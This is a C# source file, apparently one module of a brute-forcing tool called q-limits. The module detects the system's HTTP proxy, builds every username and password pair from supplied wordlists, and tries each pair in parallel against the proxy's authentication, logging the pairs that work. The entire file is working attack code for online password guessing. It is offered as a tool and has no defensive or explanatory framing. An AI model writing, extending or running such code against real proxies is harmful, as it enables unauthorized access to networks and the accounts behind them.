using Spectre.Console;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace q_limits.Modules
{
    public class HttpProxyModule : IModule
    {
        public HttpProxyModule()
        {
            Name = "Http Proxy";
            ID = "http-proxy";
            Help = "NONONO";
        }
        public override void Load(string dest, int thCount, CredentialContext credContext, Dictionary<string, string> argD, ProgressContext progCtx)
        {
            var det = WebRequest.GetSystemWebProxy();
            Uri proxyurl = det.GetProxy(new Uri(dest));

            if (proxyurl == null)
            {
                AnsiConsole.MarkupLine("[red]No proxy detected[/]");
                return;
            }

            var buildTask = progCtx.AddTask("[gray][[Module]][/] Building list into mem", true, credContext.Combinations);
            List<Credential> possibilities = new();

            foreach (var username in credContext.Usernames)
            {
                foreach (var password in credContext.Passwords)
                {
                    possibilities.Add(new(username, password));
                    buildTask.Increment(1);
                }
            }

            buildTask.Value = buildTask.MaxValue;
            var mainTask = progCtx.AddTask("[gray][[Module]][/] Breaking limits", true, possibilities.Count);
            ParallelExecutor.ForEachAsync(thCount, possibilities, x => 
            {
                try
                {
                    WebProxy webProxy = new(proxyurl, true);
                    webProxy.Credentials = new NetworkCredential(x.Key, x.Value);

                    WebRequest web = WebRequest.Create(dest);
                    web.Proxy = webProxy;

                    web.GetResponse();

                    ModuleService.ReportSuccess(dest, x);
                }
                catch (Exception) { /* Don't Care */ }

                lock (mainTask)
                {
                    mainTask.Increment(1);
                }
                return Task.CompletedTask;
            }).GetAwaiter().GetResult();

            mainTask.Value = mainTask.MaxValue;
        }
    }
}
